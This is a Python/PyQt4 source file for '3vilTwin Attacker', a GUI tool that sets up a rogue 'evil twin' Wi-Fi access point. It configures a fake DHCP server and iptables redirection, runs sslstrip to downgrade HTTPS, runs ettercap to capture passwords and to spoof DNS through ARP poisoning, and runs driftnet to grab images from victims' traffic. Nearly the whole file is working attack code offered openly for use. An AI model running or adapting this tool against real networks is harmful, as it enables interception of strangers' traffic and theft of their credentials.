#! /usr/bin/python
#coding: utf-8

#P0cL4bs Team * { N4sss , MMXM , Kwrnel, MovCode, joridos, Mh4x0f} *
#The MIT License (MIT)
#Version 1.0
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from re import search
from os import system,path,mkdir,geteuid
from platform import dist
from subprocess import Popen,PIPE
from shutil import move
from shutil import copy2
from time import sleep
BOLD = '\033[1m'
BLUE = '\033[34m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[91m'
ENDC = '\033[0m'
__author__ = '@mh4x0f P0cl4bs Team'
__version__= "0.1.2"
__date__= "02/05/2015"
def placa():
    comando = "ls -1 /sys/class/net"
    proc = Popen(comando,stdout=PIPE, shell=True)
    data = proc.communicate()[0]
    return  data.split('\n')

class frm_main(QWidget):

    def __init__(self, parent = None):
        super(frm_main, self).__init__(parent)
        self.create_sys_tray()
        self.Main = QVBoxLayout()
        self.intGUI()
        self.setGeometry(0, 0, 300, 400)
        self.setWindowTitle("3vilTwin  Attacker " + __version__)
        self.interface = "mon0"

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())
    def intGUI(self):

        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(200)
        Menu_file = self.myQMenuBar.addMenu('&File')
        exitAction = QAction('Exit', self)
        exitAction.triggered.connect(self.close)
        Menu_file.addAction(exitAction)

        Menu_tools = self.myQMenuBar.addMenu('&Tools')
        etter_conf = QAction("Edit Etter.dns", self)
        etter_conf.setShortcut("Ctrl+U")
        dns_spoof = QAction("Active Dns Spoof", self)
        dns_spoof.setShortcut("Ctrl+D")
        ettercap = QAction("Active Ettercap", self)
        ettercap.setShortcut("Ctrl+E")
        ssl = QAction("Active Sslstrip ", self)
        ssl.setShortcut("Ctrl+S")
        btn_drift = QAction("Active DriftNet", self)
        btn_drift.setShortcut("Ctrl+Y")


        etter_conf.triggered.connect(self.Edit_etter)
        dns_spoof.triggered.connect(self.start_dns)
        ettercap.triggered.connect(self.start_etter)
        ssl.triggered.connect(self.start_ssl)
        btn_drift.triggered.connect(self.start_dift)

        Menu_tools.addAction(etter_conf)
        Menu_tools.addAction(dns_spoof)
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(ssl)
        Menu_tools.addAction(btn_drift)

        Menu_extra= self.myQMenuBar.addMenu("&Extra")
        Menu_about = QAction("About",self)
        Menu_help = QAction("Help",self)

        Menu_about.triggered.connect(self.about)
        Menu_help.triggered.connect(self.help)

        Menu_extra.addAction(Menu_about)
        Menu_extra.addAction(Menu_help)

        self.input_gw = QLineEdit(self)
        self.input_AP = QLineEdit(self)
        self.input_canal = QLineEdit(self)
        self.w = QComboBox(self)
        n = placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.w.addItem(n[i])
        self.form = QFormLayout()

        hLine 	=  QFrame()
        hLine.setFrameStyle(QFrame.HLine)
        hLine.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        self.form.addRow(hLine)
        hLine2 	=  QFrame()
        hLine2.setFrameStyle(QFrame.HLine)
        hLine2.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        self.form.addRow(hLine2)


        self.logo = QPixmap("Module/logo.png")
        self.label_imagem = QLabel()
        self.label_imagem.setPixmap(self.logo)
        self.form.addRow(self.label_imagem)

        self.form.addRow("Geteway:", self.input_gw)
        self.form.addRow("AP Name:", self.input_AP)
        self.form.addRow("Channel:", self.input_canal)
        self.form.addRow("Network Card List:", self.w)

        self.btn_start_attack = QPushButton("Start Attack", self)
        self.btn_start_attack.setFixedWidth(160)
        self.btn_cancelar = QPushButton("Kill Attack", self)
        self.btn_cancelar.setFixedWidth(160)
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.start_air)


        self.form2 = QFormLayout()
        self.form2.addRow(self.btn_start_attack, self.btn_cancelar)
        self.listbox = QListWidget(self)
        self.form2.addRow(self.listbox)
        self.Main.addLayout(self.form)
        self.Main.addLayout(self.form2)
        self.setLayout(self.Main)


    def kill(self):
        nano = ["echo \"0\" > /proc/sys/net/ipv4/ip_forward","iptables --flush",  "iptables --table nat --flush" ,\
                "iptables --delete-chain", "iptables --table nat --delete-chain", \
                "airmon-ng stop mon0" , "rm Config/confiptables.sh" , \
                 "ifconfig lo down","ifconfig at0 down &"]
        for delete in nano:
            system(delete)
        self.listbox.clear()
        system("killall xterm")
        QMessageBox.information(self,"Clear Setting", "Log CLear success ")
        system("clear")
    
    def start_etter(self):
        system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
    def start_ssl(self):
        system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
    # fix error :D dns spoof and drifnet, the bug in args -T xterm.
    def start_dns(self):
        system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
    def start_dift(self):
        system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
    def configure(self):
        self.listbox.addItem("{+} Setting dhcpd Server...")
        self.configuradhcp = open("Config/dhcpd.conf","w")
        self.configuradhcp.write("""authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name "%s";
option domain-name-servers 10.0.0.1;
range 10.0.0.20 10.0.0.50;
}"""%(self.input_AP.text()))
        self.listbox.addItem("{+} Configure Network Fake Dhcp...")
        if path.isfile("/etc/dhcp/dhcpd.conf"):
            system("rm /etc/dhcp/dhcpd.conf")
            move("Config/dhcpd.conf", "/etc/dhcp/")
        else:
            move("Config/dhcpd.conf", "/etc/dhcp/")
        self.listbox.addItem("{+} Setting interface at0 Network...")
        self.conf_iptables = open("Config/confiptables.sh", "w")
        self.conf_iptables.write("""echo "[+] Setting iptables..."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables --table nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.101
iptables -t nat -A POSTROUTING -j MASQUERADE
echo "[+] Startup DHCP..."
touch /var/run/dhcpd.pid
sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" at0
sleep 3
"""%(self.input_gw.text(),self.w.currentText()))
        self.conf_iptables.close()
        self.listbox.addItem("{+} Add Getway Interface DNET...")
        self.listbox.addItem("{+} SET POSTROUTING MASQUEREDE...")
        self.listbox.addItem("{+} Add REDIRECT port 10000 Iptables...")
        self.listbox.addItem("{+} IPtables Set with success...")
        system("chmod +x Config/confiptables.sh")
        system("xterm -geometry 75x15+1+250 -e 'bash -c \"./Config/confiptables.sh; exec bash\"' & configure=$!")
        self.configuradhcp.close()
    def start_air(self):
        self.listbox.clear()
        if search("Not Found",self.w.currentText()):
            QMessageBox.information(self,"Error", "Network interface not supported :(")
        else:
            if path.exists("Config/"):
                print(":::")
                if not geteuid() == 0:
                    sys.exit('Script must be run as root')
            else:
                mkdir("Config")
                if not geteuid() == 0:
                    sys.exit('Script must be run as root')
            system("airmon-ng start %s" %(self.w.currentText()))
            self.listbox.addItem("{+} Start airmon-ng %s"%self.w.currentText())
            system("sudo xterm -geometry 75x15+1+0 -T \"Fake AP - %s - Statup\" -e airbase-ng -c %s -e \"%s\" %s & fakeapid=$!"""%(self.interface,self.input_canal.text(),self.input_AP.text(),self.interface))
            sleep(5)
            self.configure()
            self.listbox.addItem("{+} Done")


    def Edit_etter(self):
        n = dist()
        if n[0] == "Ubuntu":
            system("xterm -e nano /etc/ettercap/etter.dns")
        elif n[0] == "debian":
            system("xterm -e nano /usr/share/ettercap/etter.dns")
        else:
            QMessageBox.information(self,"Error", "Path etter.dns not found")

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('Module/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray, SIGNAL("activated(QSystemTrayIcon::ActivationReason)"), self.on_sys_tray_activated)

        self.sysTrayMenu = QMenu(self)
        act = self.sysTrayMenu.addAction("FOO")

    def on_sys_tray_activated(self, reason):
        if reason == 3:
            self.showNormal()
        elif reason == 2:
            self.showMinimized()
    def about(self):
        QMessageBox.about(self, self.tr("About 3vilTiwn Attacker"),
            self.tr("3vilTiwn Attacker\n\n"
                    "%s\n"
                    "Version:%s\n"
                    "%s\n"
                    "Contact: p0cL4bs@gmail.com\n"
                    "The MIT License (MIT)\n"
                    "Copyright(c) 2015"% (__author__, __version__, __date__)))
    def help(self):
        QMessageBox.about(self, self.tr("Help 3vilTiwn Attacker"),
            self.tr("3vilTiwn Attacker\n\n"
                    "Contact: p0cL4bs@gmail.com\n"
                    "Report bug please!!\n\n"))

def dhcp_install():
        print ' +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
        print '|                         Pleace Necessary install dhcpd                            |'
        print '|-----------------------------------------------------------------------------------|'
        print '|                            >>> Solution Ubuntu <<<                                |'
        print '|~#sudo apt-get install isc-dhcp-server                                             |'
        print '|-----------------------------------------------------------------------------------|'
        print '|                        >>> Solution Debian wheezy <<<                             |'
        print '|~# echo "deb http://ftp.de.debian.org/debian wheezy main " >> /etc/apt/sources.list|'
        print '|~# apt-get update && apt-get install isc-dhcp-server                               |'
        print '|-----------------------------------------------------------------------------------|'
        print ' +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

if __name__ == '__main__':
    import sys
    print("[+] checking dependencies...")
    print"============================="
    lista = ["/usr/sbin/dhcpd", "/usr/sbin/airbase-ng", "/usr/sbin/ettercap", "/usr/bin/sslstrip", "/usr/bin/xterm"]
    m = []
    j = 0
    for i in lista:
        m.append(path.isfile(i))
        j += 1
    for a,b in enumerate(m):
        if m[a] == False:
            if a == 0:
                print("{-} dhcpd --> [%sOFF%s]...      |"%(RED,ENDC))
            elif a == 1:
                print("{-} airbase-ng --> [%sOFF%s]... |"%(RED,ENDC))
            elif a == 2:
                print("{-} ettercap --> [%sOFF%s]...   |"%(RED,ENDC))
            elif a == 3:
                print("{-} sslstrip --> [%sOFF%s]...   |"%(RED,ENDC))
            elif a == 4:
                print("{-} Xterm  --> [%sOFF%s]...     |"%(RED,ENDC))
        if m[a] == True:
            if a == 0:
                print("{+} dhcpd --> [%sOk%s]...       |"%(GREEN,ENDC))
            elif a == 1:
                print("{+} airbase-ng --> [%sOk%s]...  |"%(GREEN,ENDC))
            elif a == 2:
                print("{+} ettercap --> [%sOk%s]...    |"%(GREEN,ENDC))
            elif a == 3:
                print("{+} sslstrip --> [%sOk%s]...    |"%(GREEN,ENDC))
            elif a == 4:
                print("{+} Xterm  --> [%sOk%s]...      |"%(GREEN,ENDC))
    for k,g in enumerate(m):
        if m[k] == False:
            if k == 0:
                dhcp_install()
            if k == 1:
                print("{%s-%s} Pleace Necessary install %saircrack-ng%s"%(RED, ENDC,RED, ENDC))
            if k == 2:
                print("{%s-%s} Pleace Necessary install %settercap%s"%(RED, ENDC, RED, ENDC))
            if k == 3:
                print("{%s-%s} Pleace Necessary install %ssslstrip%s"%(RED, ENDC,RED, ENDC))
            if k == 4:
                print("{%s-%s} Pleace Necessary install %sxterm%s"%(RED, ENDC,RED, ENDC))
    for c in m:
        if c == False:
            exit()
    print("{+} %sStarting GUI%s...         |"%(YELLOW,ENDC))
    print"============================="
    root = QApplication(sys.argv)
    app = frm_main(None)
    app.setWindowIcon(QIcon('Module/icon.ico'))
    app.center()
    app.show()
    root.exec_()
